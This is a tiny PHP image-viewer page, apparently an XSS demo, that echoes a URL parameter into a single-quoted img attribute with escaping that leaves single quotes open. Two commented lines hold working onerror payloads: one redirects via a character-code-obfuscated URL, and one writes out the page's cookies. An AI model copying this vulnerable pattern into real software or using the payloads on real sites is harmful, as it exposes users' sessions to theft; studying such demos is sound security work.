<html>
	<head>
		<title>Image viewer</title>
	</head>
	<body>
		<?php
			$url = htmlentities($_GET["url"]);
			#$url = "' onerror='function payload() {var code=[104, 116, 116, 112, 58, 47, 47, 49, 50, 55, 46, 48, 46, 48, 46, 49];var redirect=String();for(var i=0;i!=code.length;i++){redirect=redirect.concat(String.fromCharCode(code[i]));}window.location=redirect;}payload()";
			#$url = "' onerror='document.write(document.cookie)"
		?>
		<div>
			<h1>Here is your image!</h1>
			<img src='<?php echo $url ?>' width="500">
			<p><h2>Thank you for using image viewer</h2></p>
			<p>Image source : <?php echo $url ?></p>
		</div>
	</body>
</html>
